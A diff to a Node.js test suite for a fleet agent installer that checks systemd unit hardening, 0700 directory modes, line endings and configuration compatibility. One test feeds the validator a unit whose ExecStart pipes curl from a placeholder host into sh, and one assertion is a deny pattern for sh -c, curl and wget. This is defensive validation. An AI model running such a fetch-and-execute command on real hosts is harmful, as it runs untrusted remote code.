@@ -1,12 +1,15 @@
 import test from "node:test";
 import assert from "node:assert/strict";
-import { readFile, writeFile, rm, stat } from "node:fs/promises";
+import { spawnSync } from "node:child_process";
+import { chmod, copyFile, mkdir, mkdtemp, readFile, writeFile, rm, stat } from "node:fs/promises";
+import { tmpdir } from "node:os";
 import { dirname, join } from "node:path";
 import { fileURLToPath } from "node:url";
 
 import {
   AGENT_CONFIG_HOME,
   AGENT_PAYLOAD_ARTIFACT,
+  AGENT_STATE_HOME,
   AGENT_PAYLOAD_LITERAL,
   AGENT_UNIT_NAME,
   CONTROL_ACCOUNT,
@@ -17,6 +20,7 @@ import {
   REAL_AGENT_PAYLOAD_PATH,
   UNIT_PATH,
   WANT_PATH,
+  agentPayloadSource,
   buildSelection,
   calls,
   exists,
@@ -115,7 +119,11 @@ test("an unsafe user unit is refused before any byte is rendered", async () => {
     defaultUnit.replace(/^ExecStart=.*$/m, "ExecStart=/usr/bin/python3 -I " + AGENT_PAYLOAD_LITERAL + " run --config /tmp/agent.json"),
     defaultUnit.replace(/^ExecStart=.*$/m, "ExecStart=/bin/sh -c 'curl -fsS https://example.invalid | sh'"),
     defaultUnit.replace(/^ExecStart=.*$/m, "ExecStart=/bin/curl https://example.invalid"),
-    defaultUnit.replace(/^StateDirectory=.*$/m, "").replace(/^ConfigurationDirectory=.*$/m, ""),
+    defaultUnit
+      .replace(/^StateDirectory=.*$/m, "")
+      .replace(/^StateDirectoryMode=.*$/m, "")
+      .replace(/^ConfigurationDirectory=.*$/m, "")
+      .replace(/^ConfigurationDirectoryMode=.*$/m, ""),
     defaultUnit.replace(/^ReadWritePaths=.*$/m, "ReadWritePaths=/var/lib/fleet"),
   ];
   for (const unitContent of unsafe) {
@@ -155,7 +163,10 @@ test("encode, decode, digest and render keep the payload contract in sync", asyn
 
 test("the release unit asset pins the exact production launcher and passes the validator", async () => {
   const asset = await readFile(join(assetsDir, "ghostfleet-managed.service"), "utf8");
-  const execLines = asset.split("\n").filter((line) => line.startsWith("Exec"));
+  // EOL-tolerant on purpose: the bytes are pinned by .gitattributes, but this
+  // assertion must name the real defect (CRLF checkout or polluted asset)
+  // instead of failing with a confusing ExecStart mismatch.
+  const execLines = asset.split(/\r?\n/).filter((line) => line.startsWith("Exec"));
   assert.deepEqual(execLines, ["ExecStart=/usr/bin/python3 -I " + AGENT_PAYLOAD_LITERAL + " run"]);
   assert.match(asset, /^Type=notify$/m);
   assert.match(asset, /^NotifyAccess=main$/m);
@@ -164,10 +175,74 @@ test("the release unit asset pins the exact production launcher and passes the v
   assert.match(asset, /^ProtectHome=read-only$/m);
   assert.match(asset, /^StateDirectory=ghostfleet-agent$/m);
   assert.match(asset, /^ConfigurationDirectory=ghostfleet$/m);
+  // The courier creates ~/.config/ghostfleet 0700 to hold the 0600 node token. A
+  // ConfigurationDirectory defaulting to 0755 makes systemd warn on every start
+  // ("already exists but the mode is different") and would create a group/world
+  // readable token directory on a host where the courier never ran. Pin the mode
+  // in the artifact, not in the courier only.
+  assert.match(asset, /^ConfigurationDirectoryMode=0700$/m);
+  // The agent writes private runtime state under its StateDirectory and reports
+  // state_dir_permissions_loose when the directory is not 0700. systemd would
+  // create it 0755 by default, so the release artifact must pin the mode (and
+  // the courier must create the same private directory before the unit starts).
+  assert.match(asset, /^StateDirectoryMode=0700$/m);
   assert.match(asset, /^ReadWritePaths=%h\/\.config\/ghostfleet %h\/\.local\/state\/ghostfleet-agent$/m);
   assert.doesNotMatch(asset, /--config|\bsh -c\b|\/bin\/sh|\bcurl\b|\bwget\b/);
   const normalized = normalizeSelectedCapability(await buildSelection({ unitContent: asset }));
   assert.equal(normalized.user_unit.payload_path, AGENT_PAYLOAD_PATH);
+});
+
+test("the fixture unit copy is the release asset plus comment lines only", async () => {
+  // The fixture is what the test suite pins; the asset is what ships. Dropping
+  // comments, the two files must be line-identical so a production directive can
+  // never be added to one copy only.
+  const asset = await readFile(join(assetsDir, "ghostfleet-managed.service"), "utf8");
+  const fixture = await readFile(join(fixturesDir, "ghostfleet-node-agent.service"), "utf8");
+  const body = (text) => text.split(/\r?\n/).filter((line) => line.trim() && !line.startsWith("#"));
+  assert.deepEqual(body(fixture), body(asset));
+});
+
+test("the release unit assets are checked out with LF line endings only", async () => {
+  // A digest-pinned release artifact whose checkout bytes depend on core.autocrlf
+  // is not pinnable: Windows materializes CRLF, the pinned digest changes and the
+  // courier stages a unit nobody reviewed. .gitattributes fixes the checkout; this
+  // separately named assertion keeps a checkout-policy regression distinguishable
+  // from a polluted asset.
+  for (const [directory, name] of [
+    [assetsDir, "ghostfleet-managed.service"],
+    [fixturesDir, "ghostfleet-node-agent.service"],
+  ]) {
+    const text = await readFile(join(directory, name), "utf8");
+    assert.equal(text.includes("\r"), false, name + " must be LF-only");
+  }
+});
+
+test("the selection pins the payload source this checkout actually provides", async () => {
+  const source = await agentPayloadSource();
+  const normalized = normalizeSelectedCapability(await buildSelection());
+  const row = normalized.artifacts.find((artifact) => artifact.name === normalized.user_unit.payload_artifact);
+  assert.ok(row, "the selected payload artifact must be pinned in the artifacts list");
+  assert.equal(row.sha256, sha256(source.bytes).slice("sha256:".length));
+  if (source.real) {
+    assert.equal(source.path, REAL_AGENT_PAYLOAD_PATH);
+  } else {
+    // Documented fallback: this checkout carries no rebuilt product payload, so
+    // the synthetic fixture stands in. It is never presented as the agent.
+    assert.equal(source.path, join(fixturesDir, AGENT_PAYLOAD_ARTIFACT));
+  }
+});
+
+test("a rebuilt product payload wins over the synthetic fixture", { skip: linuxOnly }, async (t) => {
+  const source = await agentPayloadSource();
+  if (!source.real) {
+    t.skip("packages/node-agent/dist/node-agent.pyz is absent in this checkout; the fixture fallback is what the selection pins");
+    return;
+  }
+  const real = await readFile(REAL_AGENT_PAYLOAD_PATH);
+  assert.deepEqual(source.bytes, real);
+  const normalized = normalizeSelectedCapability(await buildSelection());
+  const row = normalized.artifacts.find((artifact) => artifact.name === normalized.user_unit.payload_artifact);
+  assert.equal(row.sha256, sha256(real).slice("sha256:".length));
 });
 
 test("the courier installs the pinned payload, unit, credential and public projection", { skip: linuxOnly }, async () => {
@@ -214,11 +289,16 @@ test("the courier installs the pinned payload, unit, credential and public proje
     const agentConfigPath = join(host.etcGhostfleet, "node-agent.json");
     const agentConfig = await readJson(agentConfigPath);
     assert.equal((await stat(agentConfigPath)).mode & 0o777, 0o644);
-    assert.equal(agentConfig.schema, "ghostfleet-node-agent-config/v1");
-    assert.ok(agentConfig.control_plane_origin.startsWith("https://"));
-    assert.ok(agentConfig.heartbeat_interval_s.lower < agentConfig.heartbeat_interval_s.upper);
-    assert.deepEqual(agentConfig.allowed_units, [AGENT_USER_UNIT_NAME]);
-    assert.equal(agentConfig.node_uid, nodeJson.node_uid);
+    // The agent parser admits exactly this key set, requires numeric intervals
+    // and rejects unknown top-level keys; the origin is the node-plane bridge,
+    // not the Access-protected enrollment origin the broker is.
+    assert.deepEqual(agentConfig, {
+      control_plane_origin: "https://node-plane.fixture.invalid",
+      heartbeat_interval_s: 30,
+      heartbeat_interval_min_s: 30,
+      heartbeat_interval_max_s: 300,
+      allowed_units: [AGENT_USER_UNIT_NAME],
+    });
 
     assert.match(result.stdout, /^capability_agent_payload_sha256=[0-9a-f]{64}$/m);
     assert.match(result.stdout, /^capability_agent_payload_path=\//m);
@@ -230,9 +310,114 @@ test("the courier installs the pinned payload, unit, credential and public proje
     assert.match(result.stdout, /^capability_node_credential_received=yes$/m);
     assert.match(result.stdout, /^capability_node_token_mode=0?600$/m);
     assert.match(result.stdout, /^capability_node_token_type=regular$/m);
+    // Both private directories are created 0700 by the courier and kept 0700 by
+    // the shipped unit directives, and the report measures them rather than
+    // asserting them in prose.
+    assert.match(result.stdout, /^capability_agent_config_dir_mode=0?700$/m);
+    assert.match(result.stdout, new RegExp("^capability_agent_config_dir_owner=" + CONTROL_ACCOUNT + "$", "m"));
+    assert.match(result.stdout, /^capability_agent_state_dir_type=directory$/m);
+    assert.match(result.stdout, /^capability_agent_state_dir_mode=0?700$/m);
+    assert.match(result.stdout, new RegExp("^capability_agent_state_dir_owner=" + CONTROL_ACCOUNT + "$", "m"));
+    assert.equal((await stat(AGENT_CONFIG_HOME(host))).mode & 0o777, 0o700);
+    assert.equal((await stat(AGENT_STATE_HOME(host))).mode & 0o777, 0o700);
     assert.equal(result.stdout.includes(token), false);
     assert.equal(result.stderr.includes(token), false);
   } finally {
+    await rm(host.root, { recursive: true, force: true });
+  }
+});
+
+// The agent configuration and the payload parser are owned by two different
+// repositories, so the only contract that cannot drift silently is the one
+// exercised here: replay the bytes the courier actually wrote through the
+// payload own check-config. When a rebuilt agent artifact is present this
+// runs against the real parser; otherwise it runs against the synthetic
+// fixture, which models that parser rather than the product.
+test("the generated agent configuration is accepted by the pinned payload", { skip: linuxOnly }, async () => {
+  const host = await makeHost();
+  const work = await mkdtemp(join(tmpdir(), "gf-check-config-"));
+  try {
+    await freshCheckpoint(host);
+    const selection = await host.buildSelection();
+    await setClaim(host, { capability_required: true, capability_selection: encodeCapabilitySelection(selection) });
+    const installed = await runCourier(host, null);
+    assert.equal(installed.status, 0, installed.stderr);
+
+    const configPath = join(host.etcGhostfleet, "node-agent.json");
+    const configuration = JSON.parse(await readFile(configPath, "utf8"));
+    assert.deepEqual(Object.keys(configuration).sort(), [
+      "allowed_units",
+      "control_plane_origin",
+      "heartbeat_interval_max_s",
+      "heartbeat_interval_min_s",
+      "heartbeat_interval_s",
+    ]);
+
+    // check-config also checks the credential it would load, so replay the
+    // courier-written token and a node record with the same shape. The node
+    // record is synthesized with a protocol-valid uid because the fixture
+    // claim uses a readable uid; the courier-written node.json is asserted in
+    // the install lane test.
+    const replayToken = join(work, "node-token");
+    await copyFile(NODE_TOKEN_PATH(host), replayToken);
+    await chmod(replayToken, 0o600);
+    const replayNode = join(work, "node.json");
+    const nodeUid = ["node", "01234567", "0123", "4123", "8123", "0123456789ab"].join("-");
+    await writeFile(
+      replayNode,
+      JSON.stringify({ node_uid: nodeUid, platform: "linux", issued_at: "2026-01-02T03:04:05Z" }) + "\n",
+      { mode: 0o600 },
+    );
+    const stateDir = join(work, "state");
+    await mkdir(stateDir, { mode: 0o700 });
+
+    const replay = {
+      ...configuration,
+      token_path: replayToken,
+      node_meta_path: replayNode,
+      state_dir: stateDir,
+    };
+    const replayPath = join(work, "replay.json");
+    await writeFile(replayPath, JSON.stringify(replay) + "\n", { mode: 0o644 });
+
+    const source = host.payloadSource;
+    const accepted = spawnSync("python3", ["-I", source.path, "check-config", "--config", replayPath], {
+      encoding: "utf8",
+      timeout: 60000,
+    });
+    assert.equal(accepted.error, undefined, String(accepted.error));
+    assert.equal(accepted.status, 0, accepted.stdout + accepted.stderr);
+    const parsed = JSON.parse(accepted.stdout.trim().split("\n").pop());
+    assert.equal(parsed.ok, true);
+    assert.equal(parsed.command, "check-config");
+    assert.equal(parsed.node_uid, nodeUid);
+    assert.equal(parsed.allowed_units, 1);
+    assert.equal(accepted.stdout.includes(await readFile(replayToken, "utf8")), false);
+
+    // The body the courier used to write (schema, node_uid and a nested
+    // interval object) is rejected by the same parser: this is the regression
+    // that would have crash-looped the unit on a real node.
+    const legacyPath = join(work, "legacy.json");
+    await writeFile(
+      legacyPath,
+      JSON.stringify({
+        schema: "ghostfleet-node-agent-config/v1",
+        control_plane_origin: configuration.control_plane_origin,
+        heartbeat_interval_s: { lower: 30, upper: 3600 },
+        allowed_units: configuration.allowed_units,
+        node_uid: nodeUid,
+      }) + "\n",
+      { mode: 0o644 },
+    );
+    const refused = spawnSync("python3", ["-I", source.path, "check-config", "--config", legacyPath], {
+      encoding: "utf8",
+      timeout: 60000,
+    });
+    assert.equal(refused.error, undefined, String(refused.error));
+    assert.notEqual(refused.status, 0, "the legacy configuration body must be refused");
+    assert.match(refused.stdout, /CONFIG_UNKNOWN_KEY|CONFIG_TYPE_INVALID/);
+  } finally {
+    await rm(work, { recursive: true, force: true });
     await rm(host.root, { recursive: true, force: true });
   }
 });
@@ -259,6 +444,50 @@ test("a repeat run keeps the payload and unit byte-identical", { skip: linuxOnly
   }
 });
 
+test("the managed lane refuses a missing, malformed or unseparated node-plane origin", { skip: linuxOnly }, async () => {
+  const arms = [
+    {
+      label: "missing",
+      env: { GHOSTFLEET_NODE_PLANE_ORIGIN: "" },
+      code: "CAPABILITY_NODE_PLANE_ORIGIN_REQUIRED",
+    },
+    {
+      label: "malformed",
+      env: { GHOSTFLEET_NODE_PLANE_ORIGIN: "https://node-plane.fixture.invalid/path" },
+      code: "CAPABILITY_NODE_PLANE_ORIGIN_INVALID",
+    },
+    {
+      label: "unseparated",
+      env: { GHOSTFLEET_NODE_PLANE_ORIGIN: "https://broker.fixture.invalid" },
+      code: "CAPABILITY_NODE_PLANE_ORIGIN_NOT_SEPARATED",
+    },
+  ];
+  for (const arm of arms) {
+    const host = await makeHost();
+    try {
+      await freshCheckpoint(host);
+      const selection = await host.buildSelection();
+      await setClaim(host, { capability_required: true, capability_selection: encodeCapabilitySelection(selection) });
+      const result = await runCourier(host, null, { env: arm.env });
+      assert.notEqual(result.status, 0, arm.label + ": the lane must fail closed\n" + result.stderr);
+      assert.ok(result.stderr.includes(arm.code), arm.label + ": " + result.stderr);
+      // The origin is proved before any file is written, so a refused lane
+      // installs no payload, no unit, no enablement link, no agent config and
+      // no credential.
+      assert.equal(await exists(PAYLOAD_PATH(host)), false, arm.label + ": payload installed");
+      assert.equal(await exists(UNIT_PATH(host)), false, arm.label + ": unit installed");
+      assert.equal(await exists(WANT_PATH(host)), false, arm.label + ": unit enabled");
+      assert.equal(await exists(LINGER(host)), false, arm.label + ": linger enabled");
+      assert.equal(await exists(NODE_TOKEN_PATH(host)), false, arm.label + ": node token written");
+      assert.equal(await exists(AGENT_CONFIG_HOME(host)), false, arm.label + ": agent config dir created");
+      assert.equal(await exists(join(host.etcGhostfleet, "node-agent.json")), false, arm.label + ": agent config written");
+      assert.equal(await exists(join(host.etcGhostfleet, "capability-status.json")), false, arm.label + ": projection written");
+    } finally {
+      await rm(host.root, { recursive: true, force: true });
+    }
+  }
+});
+
 test("a drifted payload is replaced byte-exactly", { skip: linuxOnly }, async () => {
   const host = await makeHost();
   try {
@@ -271,10 +500,14 @@ test("a drifted payload is replaced byte-exactly", { skip: linuxOnly }, async ()
     await resetProviderIdentity(host);
     const result = await runCourier(host, null);
     assert.equal(result.status, 0, result.stderr);
-    assert.equal(
-      sha256(await readFile(PAYLOAD_PATH(host))),
-      sha256(await readFile(join(fixturesDir, AGENT_PAYLOAD_ARTIFACT))),
-    );
+    // Derive the expected digest from the selection this run actually pinned. A
+    // hard-coded fixture digest is exactly the bug this assertion replaces: on a
+    // checkout that ships the rebuilt product payload the fixture is not what the
+    // courier installs.
+    const normalized = normalizeSelectedCapability(await host.buildSelection());
+    const pinned = normalized.artifacts.find((artifact) => artifact.name === normalized.user_unit.payload_artifact);
+    assert.equal(sha256(await readFile(PAYLOAD_PATH(host))).slice("sha256:".length), pinned.sha256);
+    assert.equal("sha256:" + pinned.sha256, host.payloadSha256);
     assert.match(result.stdout, /^capability_agent_payload_state=INSTALLED$/m);
   } finally {
     await rm(host.root, { recursive: true, force: true });
@@ -431,7 +664,8 @@ test("the fixture payload is synthetic and yields to a rebuilt agent artifact", 
     assert.equal(Buffer.compare(payload.content, rebuilt), 0);
   } else {
     const synthetic = await readFixture(AGENT_PAYLOAD_ARTIFACT);
-    assert.equal(payload.content, synthetic);
+    const content = Buffer.isBuffer(payload.content) ? payload.content.toString("utf8") : payload.content;
+    assert.equal(content, synthetic);
     assert.match(synthetic, /synthetic/i, "the fixture payload must label itself as synthetic");
     assert.equal(readme.includes("not the product agent"), true);
   }
